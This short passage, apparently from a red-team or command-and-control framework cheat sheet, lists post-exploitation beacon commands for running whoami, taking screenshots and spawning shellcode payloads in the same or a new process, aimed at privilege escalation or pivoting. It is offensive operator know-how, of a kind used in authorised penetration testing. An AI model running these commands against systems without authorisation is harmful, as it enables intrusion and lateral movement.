Once you have planted a beacon in the target system you can start using commands to get information to either privilege escalate or pivot.

```
help
```

#### `whoami`
```
cmd --command whoami
```

#### Screenshot
```
screenshot --execConf.execType SELF
```

#### Spawn a new Shell (when collaborating)
**Spawn inside the Same Process**
First, create a new `shellcode` payload. Then, check the `ID` number for the below command.
```
spawn --payloadID <number> --execConf.execType SELF
```

**Spawn inside a New Process**
```
spawn --payloadID <number> --execConf.execType NEW
```
#### 

